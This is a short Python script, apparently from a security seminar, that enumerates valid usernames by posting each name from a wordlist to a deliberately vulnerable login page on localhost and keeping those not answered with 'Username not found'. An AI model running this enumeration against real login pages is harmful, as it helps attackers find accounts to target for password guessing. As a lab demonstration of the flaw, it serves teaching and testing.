import requests

url = "http://127.0.0.1/seminar/enum/chitChat_vuln/index.php"

f = open("usernames.txt", "r")
data = f.read()
f.close()

data = data.split("\n")
usernames = []
for d in data: 
	req = requests.post(url, data={"username":d, "password":""})
	if not("Username not found" in req.text):
		usernames.append(d)

print("Enumerated Usernames: ")
for d in usernames: 
	print(d)
		

